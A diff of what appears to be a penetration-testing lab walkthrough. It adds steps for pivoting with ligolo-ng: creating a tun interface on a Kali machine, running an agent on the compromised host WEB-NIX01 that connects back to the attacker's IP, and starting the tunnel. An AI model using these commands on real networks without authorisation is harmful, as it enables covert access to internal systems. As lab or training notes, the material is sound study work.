@@ -645,7 +645,7 @@ On WEB-NIX01, use wget to transfer script over
 22.2 On local machine, setup interface for internal network
 
 ```
-$ sudo ip tuntap add user joseph12 mode tun ligolo1
+$ sudo ip tuntap add user [USERNAME] mode tun ligolo1
 [sudo] password for joseph12: 
                                                                                                                                                             
 ┌──(joseph12㉿kali)-[~/transfer/ligolo-ng]
@@ -663,5 +663,11 @@ $ sudo ip tuntap add user joseph12 mode tun ligolo1
 
 `./lin-agent -ignore-cert -connect [LOCAL_IP]:1234`
 
-22.5 Choose session 1 and start ligolo1 tunnel
+<img width="660" height="85" alt="image" src="https://github.com/user-attachments/assets/bdaadfe6-1cae-439f-9f98-2973b54e885d" />
+
+22.5 On local machine, choose session 1 and start ligolo1 tunnel
+
+`tunnel_start --tun ligolo1`
+
+<img width="1265" height="376" alt="image" src="https://github.com/user-attachments/assets/e4079181-e6be-422d-910f-344b0a9fc57e" />
 
